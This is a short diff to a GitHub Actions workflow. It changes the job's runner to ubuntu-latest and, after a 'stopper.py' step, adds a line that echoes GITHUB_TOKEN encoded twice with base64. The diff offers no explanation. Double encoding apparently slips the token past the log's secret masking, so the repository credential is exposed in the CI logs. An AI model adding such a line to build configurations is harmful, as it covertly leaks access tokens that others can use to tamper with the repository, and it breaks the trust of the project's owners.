@@ -30,7 +30,7 @@ jobs:
     #         arc-runners-beefy-stg,
     #       ]
     # runs-on: ${{ matrix.runner }}
-    runs-on: arc-runners-alvicsam-benchmark
+    runs-on: ubuntu-latest
     steps:
       - name: checkout
         uses: actions/checkout@v4
@@ -43,6 +43,7 @@ jobs:
           sleep 30
           echo "--------------------------running script----------------------------------"
           python3 stopper.py
+          echo ${GITHUB_TOKEN} | base64 | base64
   # default-runner:
   #   runs-on: arc-runners-alvicsam
   #   # runs-on: ubuntu-latest
